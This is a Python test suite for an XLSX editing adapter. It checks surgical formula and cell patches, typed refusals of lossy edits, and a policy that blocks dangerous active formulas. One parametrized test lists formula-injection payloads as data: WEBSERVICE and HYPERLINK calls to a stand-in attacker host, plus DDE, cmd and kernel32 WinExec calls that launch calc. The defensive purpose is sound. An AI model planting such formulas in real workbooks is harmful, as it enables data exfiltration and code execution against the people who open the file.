from __future__ import annotations

import hashlib
import zipfile
from collections.abc import Callable
from pathlib import Path
from typing import cast

import pytest
from openpyxl import Workbook, load_workbook
from openpyxl.comments import Comment
from openpyxl.worksheet.table import Table
from openpyxl.worksheet.worksheet import Worksheet

from birkin.office.adapters.xlsx import XlsxAdapter
from birkin.office.errors import DocumentError, DocumentErrorCode


def _book(path: Path) -> Path:
    parts = {
        "[Content_Types].xml": b"<Types/>",
        "xl/workbook.xml": b'''<workbook xmlns:r="urn:r"><sheets><sheet name="Data" sheetId="1" r:id="rId1"/><sheet name="Secret" sheetId="2" state="hidden" r:id="rId2"/></sheets><definedNames><definedName name="Local" localSheetId="0">Data!$A$1</definedName></definedNames></workbook>''',
        "xl/_rels/workbook.xml.rels": b'''<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="worksheet" Target="worksheets/sheet2.xml"/><Relationship Id="rExt" Type="externalLink" Target="https://invalid.example/a.xlsx" TargetMode="External"/></Relationships>''',
        "xl/worksheets/sheet1.xml": b'''<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="urn:r"><cols><col min="2" max="3" hidden="1"/></cols><sheetData><row r="1"><c r="A1" s="1"><v>7</v></c><c r="B1" t="s"><v>0</v></c><c r="C1" t="inlineStr"><is><t>inline</t></is></c><c r="D1" t="d"><v>2024-01-01</v></c><c r="E1" t="e"><v>#REF!</v></c><c r="F1"><f>A1*2</f><v>14</v></c><c r="G1"><f t="shared" si="1" ref="G1:G2">A1+1</f><v>8</v></c></row><row r="2" hidden="1"><c r="G2"><f t="shared" si="1"/><v>9</v></c></row></sheetData><mergeCells count="1"><mergeCell ref="A3:B3"/></mergeCells><autoFilter ref="A1:G9"/><tableParts count="1"><tablePart r:id="rTable"/></tableParts><drawing r:id="rDraw"/><legacyDrawing r:id="rComments"/></worksheet>''',
        "xl/worksheets/sheet2.xml": b'<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>',
        "xl/worksheets/_rels/sheet1.xml.rels": b'''<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rTable" Type="table" Target="../tables/table1.xml"/><Relationship Id="rDraw" Type="drawing" Target="../drawings/drawing1.xml"/><Relationship Id="rComments" Type="comments" Target="../comments1.xml"/></Relationships>''',
        "xl/sharedStrings.xml": b'<sst><si><t>shared</t></si></sst>',
        "xl/styles.xml": b'<styleSheet><cellXfs count="2"><xf/><xf numFmtId="14"/></cellXfs></styleSheet>',
        "xl/tables/table1.xml": b'<table name="Sales" displayName="Sales" ref="A1:G9"><autoFilter ref="A1:G9"/></table>',
        "xl/comments1.xml": b'<comments><authors><author>Ada</author></authors><commentList><comment ref="A1" authorId="0"><text><t>note</t></text></comment></commentList></comments>',
        "xl/threadedComments/threadedComment1.xml": b'<ThreadedComments><threadedComment ref="B1" personId="p1"><text>thread</text></threadedComment></ThreadedComments>',
        "xl/drawings/drawing1.xml": b'<drawing><twoCellAnchor/></drawing>',
        "xl/drawings/_rels/drawing1.xml.rels": b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rChart" Type="chart" Target="../charts/chart1.xml"/><Relationship Id="rImage" Type="image" Target="../media/image1.png"/></Relationships>',
        "xl/charts/chart1.xml": b'<chart><title>sentinel</title></chart>',
        "xl/media/image1.png": b'PNG',
        "xl/calcChain.xml": b'<calcChain><c r="F1" i="1"/></calcChain>',
        "xl/vbaProject.bin": b'VBA', "xl/activeX/activeX1.bin": b'ACTIVEX',
        "xl/embeddings/oleObject1.bin": b'OLE', "custom/unknown.bin": b'UNKNOWN',
    }
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, data in parts.items():
            archive.writestr(name, data)
    return path


def _hashes(path: Path) -> dict[str, str]:
    with zipfile.ZipFile(path) as archive:
        return {name: hashlib.sha256(archive.read(name)).hexdigest() for name in archive.namelist()}


def _replace_sheet(path: Path, transform: Callable[[bytes], bytes]) -> None:
    with zipfile.ZipFile(path) as archive:
        parts = {name: archive.read(name) for name in archive.namelist()}
    parts["xl/worksheets/sheet1.xml"] = transform(
        parts["xl/worksheets/sheet1.xml"]
    )
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, payload in parts.items():
            archive.writestr(name, payload)


def test_openpyxl_real_workbook_remains_loadable_after_formula_surgery(tmp_path: Path) -> None:
    source, output = tmp_path / "real.xlsx", tmp_path / "edited.xlsx"
    workbook = Workbook()
    sheet = cast("Worksheet", workbook.active)
    sheet.title = "Data"
    sheet.append(["Amount", "Label"])
    sheet.append([7, "Value"])
    sheet["C2"] = "=A2*2"
    sheet["A1"].comment = Comment("note", "Ada")
    sheet.merge_cells("D1:E1")
    sheet.row_dimensions[2].hidden = True
    sheet.column_dimensions["B"].hidden = True
    sheet.add_table(Table(displayName="Sales", ref="A1:B2"))
    workbook.save(source)

    inventory = XlsxAdapter().operation_inventory(source)
    assert inventory["tables"] and inventory["comments"]
    receipt = XlsxAdapter().patch_formula(
        source, output, {"sheet": "Data", "cell": "C2"}, "A2*3",
        expected_formula="A2*2",
    )
    reopened = load_workbook(output, data_only=False)
    reopened_sheet = cast("Worksheet", reopened["Data"])
    assert cast("object", reopened_sheet["C2"].value) == "=A2*3"
    assert reopened_sheet.tables
    assert receipt["cache_stale"] is True


def test_inventory_has_stable_sheet_aware_locators_and_named_structures(tmp_path: Path) -> None:
    inventory = XlsxAdapter().operation_inventory(_book(tmp_path / "source.xlsm"))
    cells = {cast(dict[str, str], item["locator"])["cell"]: item for item in inventory["cells"]}
    assert cells["B1"]["storage"] == "shared_string" and cells["B1"]["value"] == "shared"
    assert cells["C1"]["storage"] == "inline_string"
    assert cells["D1"]["storage"] == "date"
    assert cells["E1"]["storage"] == "error"
    assert cells["F1"]["formula_type"] == "normal"
    assert cells["G1"]["formula_type"] == "shared"
    assert inventory["tables"][0]["name"] == "Sales"
    assert inventory["named_ranges"][0]["scope"] == "Data"
    assert inventory["merged_cells"][0]["reference"] == "A3:B3"
    assert inventory["comments"][0]["kind"] == "legacy"
    assert {item["kind"] for item in inventory["drawings"]} == {"chart", "image"}


def test_formula_text_edit_is_surgical_and_marks_cache_stale(tmp_path: Path) -> None:
    source, output = _book(tmp_path / "source.xlsm"), tmp_path / "output.xlsm"
    before = _hashes(source)
    receipt = XlsxAdapter().patch_formula(source, output, {"sheet": "Data", "cell": "F1"}, "A1*3", expected_formula="A1*2")
    after = _hashes(output)
    assert receipt["cache_stale"] is True and receipt["recalculated"] is False
    assert before.keys() == after.keys()
    assert {k: v for k, v in before.items() if k != "xl/worksheets/sheet1.xml"} == {k: v for k, v in after.items() if k != "xl/worksheets/sheet1.xml"}
    with zipfile.ZipFile(output) as archive:
        sheet = archive.read("xl/worksheets/sheet1.xml")
    assert b"<f>A1*3</f><v>14</v>" in sheet


def test_explicit_numeric_cell_type_is_surgically_patchable(tmp_path: Path) -> None:
    source, output = _book(tmp_path / "source.xlsx"), tmp_path / "output.xlsx"
    _replace_sheet(source, lambda xml: xml.replace(b'<c r="A1" s="1">', b'<c r="A1" s="1" t="n">'))

    _ = XlsxAdapter().patch_cell(source, output, "A1", 9, expected_value="7")

    with zipfile.ZipFile(output) as archive:
        assert b'<c r="A1" s="1" t="n"><v>9</v></c>' in archive.read(
            "xl/worksheets/sheet1.xml"
        )


def test_bool_is_not_accepted_as_a_numeric_cell_value(tmp_path: Path) -> None:
    source, output = _book(tmp_path / "source.xlsx"), tmp_path / "output.xlsx"
    before = source.read_bytes()

    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().patch_cell(source, output, "A1", True)

    assert caught.value.code is DocumentErrorCode.UNSUPPORTED_EDIT
    assert source.read_bytes() == before
    assert not output.exists()


def test_alias_prefixed_formula_cannot_bypass_cached_formula_guard(
    tmp_path: Path,
) -> None:
    source, output = _book(tmp_path / "source.xlsx"), tmp_path / "output.xlsx"
    _replace_sheet(
        source,
        lambda xml: xml.replace(
            b'xmlns:r="urn:r"',
            b'xmlns:r="urn:r" xmlns:ss-main="http://schemas.openxmlformats.org/spreadsheetml/2006/main"',
        ).replace(b'<c r="A1" s="1"><v>7</v></c>', b'<c r="A1" s="1"><ss-main:f>1+6</ss-main:f><v>7</v></c>'),
    )
    before = source.read_bytes()

    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().patch_cell(source, output, "A1", 9)

    assert caught.value.code is DocumentErrorCode.LOSSY_WRITE_BLOCKED
    assert source.read_bytes() == before
    assert not output.exists()


def test_spreadsheetml_aliased_duplicate_cell_is_ambiguous_before_write(
    tmp_path: Path,
) -> None:
    source, output = tmp_path / "duplicate.xlsx", tmp_path / "output.xlsx"
    workbook = Workbook()
    sheet = cast("Worksheet", workbook.active)
    sheet.title = "Data"
    sheet["A1"] = 7
    workbook.save(source)
    namespace = (
        b"http://schemas.openxmlformats.org/spreadsheetml/2006/ma&#x69;n"
    )
    duplicate = (
        b'<review:c xmlns:review="' + namespace + b'" r="A1" t="n">'
        b"<review:v>8</review:v></review:c>"
    )
    _replace_sheet(
        source,
        lambda xml: xml.replace(b"</row>", duplicate + b"</row>", 1),
    )
    _ = load_workbook(source, data_only=False)
    before = source.read_bytes()

    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().patch_cell(
            source, output, "A1", 9, expected_value="7"
        )

    assert caught.value.code is DocumentErrorCode.AMBIGUOUS_LOCATOR
    assert caught.value.stage == "locate"
    assert source.read_bytes() == before
    assert not output.exists()
    _ = load_workbook(source, data_only=False)


def test_entity_decoded_array_type_cannot_bypass_dependent_guard(
    tmp_path: Path,
) -> None:
    source, output = _book(tmp_path / "source.xlsx"), tmp_path / "output.xlsx"
    _replace_sheet(
        source,
        lambda xml: xml.replace(
            b'xmlns:r="urn:r"',
            b'xmlns:r="urn:r" xmlns:ss-main="http://schemas.openxmlformats.org/spreadsheetml/2006/main"',
        ).replace(
            b'</row><row r="2"',
            b'<c r="H1"><ss-main:f t="arr&#x61;y" ref="H1:H3">A1:A3*2</ss-main:f><v>14</v></c></row><row r="2"',
        ).replace(b'</c></row></sheetData>', b'</c><c r="H2"><v>16</v></c></row></sheetData>'),
    )
    before = source.read_bytes()

    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().patch_cell(source, output, "H2", 99)

    assert caught.value.code is DocumentErrorCode.LOSSY_WRITE_BLOCKED
    assert source.read_bytes() == before
    assert not output.exists()


def test_cached_dependent_inside_array_formula_range_is_not_patchable(
    tmp_path: Path,
) -> None:
    source, output = _book(tmp_path / "source.xlsx"), tmp_path / "output.xlsx"
    _replace_sheet(
        source,
        lambda xml: xml.replace(
            b'</row><row r="2"',
            b"".join(
                (
                    b'<c r="H1"><f t="array" ref="H1:H3">A1:A3*2</f><v>14</v></c>',
                    b'</row><row r="2"',
                )
            ),
        ).replace(b'</c></row></sheetData>', b'</c><c r="H2"><v>16</v></c></row></sheetData>'),
    )
    before = source.read_bytes()

    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().patch_cell(source, output, "H2", 99)

    assert caught.value.code is DocumentErrorCode.LOSSY_WRITE_BLOCKED
    assert source.read_bytes() == before
    assert not output.exists()


def test_sheet_aware_style_and_visibility_edits_are_bounded(tmp_path: Path) -> None:
    source = _book(tmp_path / "source.xlsm")
    styled = tmp_path / "styled.xlsm"
    receipt = XlsxAdapter().patch_style(source, styled, {"sheet": "Data", "cell": "A1"}, 0, expected_style=1)
    assert receipt["changed_parts"] == ["xl/worksheets/sheet1.xml"]
    visible = tmp_path / "visible.xlsm"
    receipt = XlsxAdapter().set_sheet_visibility(styled, visible, {"sheet": "Secret"}, "visible")
    assert receipt["changed_parts"] == ["xl/workbook.xml"]


def test_existing_row_and_column_visibility_records_are_surgical(tmp_path: Path) -> None:
    source, row_output = _book(tmp_path / "source.xlsm"), tmp_path / "row.xlsm"
    row_receipt = XlsxAdapter().set_row_hidden(source, row_output, {"sheet": "Data"}, 2, False)
    column_output = tmp_path / "column.xlsm"
    column_receipt = XlsxAdapter().set_column_hidden(row_output, column_output, {"sheet": "Data"}, 2, 3, False)
    assert row_receipt["operation"] == "hidden_row"
    assert column_receipt["operation"] == "hidden_column"
    with zipfile.ZipFile(column_output) as archive:
        sheet = archive.read("xl/worksheets/sheet1.xml")
    assert b'<row r="2" hidden="0">' in sheet
    assert b'<col min="2" max="3" hidden="0"/>' in sheet
    before, after = _hashes(source), _hashes(column_output)
    assert {key: value for key, value in before.items() if key != "xl/worksheets/sheet1.xml"} == {key: value for key, value in after.items() if key != "xl/worksheets/sheet1.xml"}


def test_capabilities_name_every_requested_operation_class() -> None:
    capabilities = XlsxAdapter().operation_capabilities()
    assert {"sheet", "cell", "range", "table", "named_range", "formula", "style", "comment", "merged_cells", "hidden_row", "hidden_column", "chart"} == set(capabilities)
    assert capabilities["formula"]["state"] == "surgical"
    assert capabilities["table"]["state"] == "refused"


@pytest.mark.parametrize("operation", ["range", "table", "named_range", "comment", "merged_cells", "chart"])
def test_structural_or_relationship_sensitive_operations_are_typed_refusals(tmp_path: Path, operation: str) -> None:
    source, output = _book(tmp_path / "source.xlsm"), tmp_path / "output.xlsm"
    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().apply_operation(source, output, {"type": operation})
    assert caught.value.code is DocumentErrorCode.LOSSY_WRITE_BLOCKED
    assert caught.value.details["operation"] == operation
    assert not output.exists()


@pytest.mark.parametrize(
    "formula",
    [
        'WEBSERVICE("https://attacker.invalid/data")',
        "cmd|' /C calc'!A0",
        "'[payroll.xlsx]Data'!A1",
        'HYPERLINK("https://attacker.invalid/click", "click")',
        'FILTERXML(WEBSERVICE("https://attacker.invalid/data"), "//x")',
        'CALL("kernel32", "WinExec", "JJ", "calc", 1)',
        'RTD("malicious.prog.id",, "topic")',
        'DDE("cmd", "/C calc")',
        'UNKNOWN_ACTIVE_FUNCTION("payload")',
        "'https://attacker.invalid/[payroll.xlsx]Data'!A1",
    ],
)
def test_dangerous_active_formula_mutations_fail_closed_without_output(
    tmp_path: Path, formula: str
) -> None:
    source, output = _book(tmp_path / "source.xlsm"), tmp_path / "output.xlsm"
    before = source.read_bytes()

    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().patch_formula(
            source, output, {"sheet": "Data", "cell": "F1"}, formula
        )

    assert caught.value.code is DocumentErrorCode.POLICY_DENIED
    assert caught.value.details["reason"] == "active_formula_consent_required"
    assert source.read_bytes() == before
    assert not output.exists()


@pytest.mark.parametrize(
    "formula",
    ["A1+($B$2*3.5)", "SUM(A1:A3)+ROUND(B1, 2)", 'CONCAT("safe", A1)'],
)
def test_closed_formula_policy_allows_arithmetic_references_and_safe_pure_functions(
    tmp_path: Path, formula: str
) -> None:
    source, output = _book(tmp_path / "source.xlsx"), tmp_path / "output.xlsx"

    receipt = XlsxAdapter().patch_formula(
        source, output, {"sheet": "Data", "cell": "F1"}, formula
    )

    assert receipt["operation"] == "formula"
    assert output.exists()


def test_shared_and_array_formula_edits_are_refused_without_touching_package(tmp_path: Path) -> None:
    source, output = _book(tmp_path / "source.xlsm"), tmp_path / "output.xlsm"
    with pytest.raises(DocumentError) as caught:
        _ = XlsxAdapter().patch_formula(source, output, {"sheet": "Data", "cell": "G1"}, "A1+2")
    assert caught.value.code is DocumentErrorCode.LOSSY_WRITE_BLOCKED
    assert not output.exists()
